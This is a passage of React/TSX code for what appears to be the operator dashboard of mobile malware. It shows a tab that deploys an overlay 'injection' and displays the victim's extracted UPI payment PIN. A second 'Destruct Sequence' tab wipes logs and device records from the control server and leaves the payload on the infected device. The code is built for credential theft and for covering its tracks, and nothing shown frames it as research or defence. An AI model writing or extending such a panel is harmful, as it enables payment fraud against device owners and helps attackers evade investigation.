                          <span className="text-foreground font-medium">{rawDevice.inject?.speed || '0ms'}</span>
                        </div>

                        <div className="pt-4 flex flex-col gap-2.5">
                          <span className="text-xs text-muted-foreground uppercase tracking-widest text-center font-bold">Extracted PIN</span>
                          <div className="bg-white/[0.04] border border-white/[0.09] border-dashed h-16 rounded-2xl flex items-center justify-center text-2xl font-bold tracking-[0.5em] text-[#a78bfa]">
                            {rawDevice.inject?.upiPin || '****'}
                          </div>
                        </div>
                      </div>

                      <button onClick={handleStartInjection} disabled={rawDevice.inject?.active} className="w-full mt-6 btn-island bg-[#8b5cf6] hover:bg-[#7c3aed] disabled:bg-[#8b5cf6]/30 disabled:cursor-not-allowed disabled:pointer-events-none text-white font-bold py-3 text-sm rounded-full flex items-center justify-center gap-2">
                        <Shield className="w-4 h-4" strokeWidth={1.6} />
                        {rawDevice.inject?.active ? 'Injection Active' : 'Deploy Overlay'}
                      </button>
                    </div>
                  </div>
                )}

                {/* Tab 5: Delete */}
                {activeTab === 'delete' && (
                  <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                    <div className="text-center mb-4">
                      <div className="bezel mx-auto w-fit mb-4 border-[#ef4444]/30">
                        <div className="bezel-inner w-16 h-16 flex items-center justify-center bg-[#ef4444]/10">
                          <AlertTriangle className="w-8 h-8 text-[#f87171]" strokeWidth={1.5} />
                        </div>
                      </div>
                      <h2 className="text-lg font-bold text-[#f87171]">Destruct Sequence</h2>
                      <p className="text-sm text-muted-foreground mt-2 leading-relaxed">
                        This will permanently wipe all logs, messages, and device records from the control server. The payload on the device will not be uninstalled, but the connection will be orphaned.
                      </p>
                    </div>

                    <div className="rounded-3xl p-6 text-center bg-[#ef4444]/[0.06] border border-[#ef4444]/20">
                      <p className="text-sm mb-6 text-[#f87171]/80 font-medium">Type the device ID to confirm or just click destruct if you're sure.</p>
                      <button onClick={handleDeleteDevice} className="w-full btn-island bg-[#ef4444] hover:bg-[#dc2626] text-white font-bold py-4 text-sm rounded-full flex items-center justify-center gap-2">
                        <Trash2 className="w-5 h-5" strokeWidth={1.6} />
                        Permanently Destruct
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </GlassCard>
          </Reveal>
        </div>
      </div>
    </Layout>
  );
}

function getBatteryValue(battery: string | undefined) {
  if (!battery) return 0;
  return parseInt(battery.replace('%', ''), 10) || 0;
}
